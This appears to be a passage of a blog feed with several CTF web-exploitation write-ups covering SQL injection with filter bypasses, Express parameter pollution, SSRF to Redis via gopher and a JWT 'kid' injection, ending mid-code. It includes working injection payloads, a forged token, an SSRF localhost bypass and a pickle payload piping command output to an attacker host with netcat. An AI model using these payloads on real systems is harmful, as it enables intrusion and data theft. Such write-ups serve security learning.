&lt;p&gt;Bingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Dump DB names :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/AJvdMXB.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;DBName : MySecretDatabase&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Dump Tables and Columns :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(&amp;lsquo;103&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/raYuUmI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Table Name&lt;/strong&gt; : SecretTable &amp;amp; &lt;strong&gt;Column Name&lt;/strong&gt; : secret_value&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;And finally let&amp;rsquo;s have our beloved flag :&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(&amp;lsquo;109&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/FanWbUZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Yees We did it , &lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}&lt;/p&gt;
&lt;p&gt;I have really liked the idea of the challenge, it&amp;rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.&lt;/p&gt;
&lt;p&gt;I hope you liked the writeup if you have any questions don&amp;rsquo;t hesitate to contact me &lt;strong&gt;Twitter&lt;/strong&gt; : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Ã¥ngstrom CTF 2k20 - Web Exploitation</title>
      <link>https://ahmed-belkahla.me/post/angstromctf20/</link>
      <pubDate>Thu, 19 Mar 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/angstromctf20/</guid>
      <description>&lt;h1 id=&#34;a-peculiar-query-180pts-73-solves-&#34;&gt;&lt;strong&gt;A Peculiar Query (180pts) (73 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/A6EHPkW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;I really liked this web task , we are given this web page that have a search functionality&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/gRutDcV.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we can read the source code&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;
const express = require(&amp;quot;express&amp;quot;);
const rateLimit = require(&amp;quot;express-rate-limit&amp;quot;);
const app = express();
const { Pool, Client } = require(&amp;quot;pg&amp;quot;);
const port = process.env.PORT || 9090;
const path = require(&amp;quot;path&amp;quot;);

const client = new Client({
	user: process.env.DBUSER,
	host: process.env.DBHOST,
	database: process.env.DBNAME,
	password: process.env.DBPASS,
	port: process.env.DBPORT
});

async function query(q) {
	const ret = await client.query(`SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;`);
	return ret;
}

app.set(&amp;quot;view engine&amp;quot;, &amp;quot;ejs&amp;quot;);

app.use(express.static(&amp;quot;public&amp;quot;));

app.get(&amp;quot;/src&amp;quot;, (req, res) =&amp;gt; {
	res.sendFile(path.join(__dirname, &amp;quot;index.js&amp;quot;));
});

app.get(&amp;quot;/&amp;quot;, async (req, res) =&amp;gt; {
	if (req.query.q) {
		try {
			let q = req.query.q;
			// no more table dropping for you
			let censored = false;
			for (let i = 0; i &amp;lt; q.length; i ++) {
				if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
					censored = true;
					q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
				}
			}
			q = q.substring(0, 80);
			const result = await query(q);
			res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
		} catch (err) {
			console.log(err);
			res.status(500);
			res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;aight wtf stop breaking things&amp;quot;});
		}
	} else {
		res.render(&amp;quot;home&amp;quot;, {results: [], err: &amp;quot;&amp;quot;});
	}
});

app.listen(port, function() {
	client.connect();
	console.log(&amp;quot;App listening on port &amp;quot; + port);
});

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;overview-&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;It&amp;rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;const ret = await client.query(&lt;code&gt;SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;&lt;/code&gt;);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But as we can see some filters are here :&#39;( these characters are filtered : [&#39;,-,&amp;quot;,.] , after some tries i have figured that it will be impossible to bypass
them so i started looking to some JS tricks.
As we can see the filter function is looping over our input and checks if there are some prohibited characters and then it will replace
them with &amp;ldquo;*&amp;rdquo; , For example if we type&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hello&amp;quot;or 1=1 &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Our input will be changed to :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hello************&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let q = req.query.q;
let censored = false;
for (let i = 0; i &amp;lt; q.length; i ++) {
	if (censored || &amp;quot;&#39;-\&amp;quot;.&amp;quot;.split``.some(v =&amp;gt; v == q[i])) {
			censored = true;
			q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
			}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And finally it&amp;rsquo;s using substring function to limit our input&amp;rsquo;s length to 80 characters&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;q = q.substring(0, 80);
const result = await query(q);
res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Hmmm everything seems okay nah ? but it&amp;rsquo;s a ctf web task we have to find some vulnerabilities ! let&amp;rsquo;s pass to how i did to solve it now, enough boring things&lt;/p&gt;
&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;The first thing i thinked about was http parameter pollution in express (read about it &lt;strong&gt;
&lt;a href=&#34;https://github.com/expressjs/express/issues/1824&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want ) ,briefly when we enter a get parameter multiple times express
has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?q=hello&amp;amp;q=allo&amp;amp;q=fword&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;req.query.q&lt;/strong&gt; will be parsed as an array &lt;strong&gt;[&amp;ldquo;hello&amp;rdquo;,&amp;ldquo;allo&amp;rdquo;,&amp;ldquo;fword&amp;rdquo;]&lt;/strong&gt; , so if we go further when we will be iterating of &lt;strong&gt;q&lt;/strong&gt; variable we will be comparing each array field with the filters
for example, if we pass this query :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=&amp;quot;or 1=1 &amp;ndash; -&amp;amp;q=fword&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;we will firstly compare &lt;strong&gt;&amp;ldquo;or 1=1 &amp;ndash; -&lt;/strong&gt; and then the second field &lt;strong&gt;fword&lt;/strong&gt; with these filtered chars &lt;strong&gt;[&#39;,-,&amp;quot;,.]&lt;/strong&gt; , they are not equal ! , Youupi we can get our flag now as we passed the check .&lt;/p&gt;
&lt;p&gt;Unfortunately , it&amp;rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won&amp;rsquo;t execute the sql query :/
Javascript weird behaviour will save us this time ! if we do &lt;strong&gt;[]+[]&lt;/strong&gt; the result is a string , the sum of two arrays is a string so if we enter a &lt;strong&gt;&amp;quot;&lt;/strong&gt; in one query parameter
we will enter this part&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;censored = true;
q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;and arrays have a built in slice function so the result of &lt;strong&gt;[]+&amp;rdquo;*&amp;ldquo;+[]&lt;/strong&gt; will be a string , we can now enter our payload with &lt;strong&gt;q=&amp;rsquo;&lt;/strong&gt; in the end to ensure that our array will be a string when it reaches the substring part
For example :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=&#39;or 1=1 &amp;ndash; -&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;will let us pass !&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;FILTERS BYPASSED SUCCESSFULLY&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code &lt;strong&gt;
&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/%C3%A5ngstromCTF2k20/A%20Peculiar%20Query/app.js&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want to test :D&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/upRUoxR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;The next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/XAVrsrR.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;and finally we find a column named &lt;strong&gt;crime&lt;/strong&gt; so our final payload will be :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20&amp;ndash;%20-&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=%27&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7KWe6dF.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Shinobis World - Web Exploitation NCSC 2.0 CTF</title>
      <link>https://ahmed-belkahla.me/post/shinobisworld/</link>
      <pubDate>Thu, 23 Jan 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/shinobisworld/</guid>
      <description>&lt;h1 id=&#34;shinobis-world-1000pts-1-solves-&#34;&gt;&lt;strong&gt;Shinobis World (1000pts) (1 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/7X3dgtW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/60QSkz4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered
so we can use 127.0.1 and maybe http or gopher protocol , firstly let&amp;rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it&lt;/p&gt;
&lt;p&gt;in fact you can use gopher protocol to interact with redis :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/_RedisCommandHERE&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;for example to list all keys:&lt;/p&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/_keys%20*&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;if we refresh the shinobis web page and then list all keys we can see some new keys that are set :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;:1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/bOKKP3k.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory&lt;/p&gt;
&lt;p&gt;So the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set&lt;/li&gt;
&lt;li&gt;if the key is set he will unpickle the data stored there and load the page using this content&lt;/li&gt;
&lt;li&gt;Our payload will be executed then Bingo we will have the flag :D&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Final Payload :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&amp;quot;cposix\nsystem\np0\n(S&amp;rsquo;ls|nc YourVPSIP 1234&amp;rsquo;\np1\ntp2\nRp3\n.&amp;rdquo;
This Payload will execute ls command and send it to our vps (don&amp;rsquo;t forget to refresh the Shinobis page because it&amp;rsquo;s the page that is being cached)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; You can find the source code of this task in the source code repo of my github repo&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..)
If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>JWT In A New Way - NCSC 2.0 CTF</title>
      <link>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</link>
      <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
      <guid>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</guid>
      <description>&lt;h1 id=&#34;jwt-in-a-new-way-1000pts-0-solves-&#34;&gt;&lt;strong&gt;JWT In a new way (1000pts) (0 Solves)&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YuMeMZE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
&lt;p&gt;And finally i&amp;rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D
However bring your coffee cup and let&amp;rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)&lt;/p&gt;
&lt;h2 id=&#34;1st-step--jwt-bypass-&#34;&gt;1st Step : JWT Bypass&lt;/h2&gt;
&lt;p&gt;After visiting the link we have a simple web page with a sign in and sign up page ;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8vDSCL.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
&lt;p&gt;So after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/mmFsMEd.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
&lt;p&gt;We go as usual to the famous jwt.io to see the content of the token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/TRIhUBU.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude
that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key &amp;lsquo;blabla&amp;rsquo;
and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe ,
let&amp;rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let&amp;rsquo;s try to trigger an error by injecting this in the kid parameter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&#39; UNION SELECT 2 &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let&amp;rsquo;s take some notes here :&lt;/p&gt;
&lt;p&gt;As we all know JWT token have 3 sections : Header + Payload + signature&lt;/p&gt;
&lt;p&gt;Header : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional&lt;/p&gt;
&lt;p&gt;Payload : it contains statements about an entity (typically, the user) and additional data .&lt;/p&gt;
&lt;p&gt;Signature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+&amp;rsquo;.&amp;lsquo;+BASE64URL(PAYLOAD))&lt;/p&gt;
&lt;p&gt;Be careful it&amp;rsquo;s BASE64URL not a regular BASE64 you can read about it here : 
&lt;a href=&#34;https://fr.wikipedia.org/wiki/Base64#base64url&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NOTE: you can use the php function hash_hmac(&amp;lsquo;sha256&amp;rsquo;, $msg, $key, true) to sign the token&lt;/p&gt;
&lt;p&gt;so after forging the JWT token and replacing it we got this page !&lt;/p&gt;
&lt;p&gt;Token i used (i have used a random key for the signature) :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/GHbrcmm.png&#34; alt=&#34;JWT&#34;&gt;&lt;/p&gt;
&lt;p&gt;Hmmmmmmm an interesting message i think we are on a good path , now let&amp;rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.&lt;/p&gt;
&lt;p&gt;We will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lsquo;UNION SELECT 1,&amp;lsquo;kahla&amp;rsquo; &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Thus the key will be forced to be kahla BUT we still get the annoying page &amp;ldquo;Here is your flag ! Just kidding &amp;quot; :&#39;( (What an evil author 3:) )&lt;/p&gt;
&lt;p&gt;I think there are some filters here :&#39;( Let&amp;rsquo;s try this payload in the kid parameter :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lsquo;UNiOn SElEcT 1,&amp;lsquo;abc&amp;rsquo; &amp;ndash; -&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The final token used:&lt;/p&gt;
&lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A&lt;/p&gt;
&lt;p&gt;And yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before&lt;/p&gt;
&lt;h2 id=&#34;2nd-step--ssrf--decrypt-&#34;&gt;2nd Step : SSRF + Decrypt&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/BLjbHaj.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/9mPssf6.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can all notice that it&amp;rsquo;s an ssrf but:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;file protocol is filtered we only can use http or https protocol&lt;/li&gt;
&lt;li&gt;localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally i used this payload that bypassed all the filters below :&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://0x7f000001/flag.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I used the hexadecimal format of local ip address :D&lt;/p&gt;
&lt;p&gt;And Bingo we have our flag but it&amp;rsquo;s encrypted
&lt;img src=&#34;https://imgur.com/cFehJVI.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public static function cryptage($content){
        $i=0;
        $words=array(&#39;kAHl4&#39;,&#39;$ecUriNets&#39;,&#39;Cha1m4&#39;,&#39;th4meUr&#39;,&#39;WhiT3HacK3Rs&#39;,&#39;Ani$Bo$$CoUldNtS0Lv31t&#39;);
        $crypted=&amp;quot;&amp;quot;;
        for($i=0;$i&amp;lt;strlen($content);$i-=-pow(0,0))
        {
            $ser=serialize(array($words[$i % 6],&#39;securinets&#39;));
            $key=intval(explode(&amp;quot;:&amp;quot;,explode(&amp;quot;;&amp;quot;,$ser)[1])[1]);
            $crypted=$crypted.chr(ord($content[$i])+$key) ;          
        }
        return $crypted;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But it&amp;rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function decryptage($content){
        $i=0;
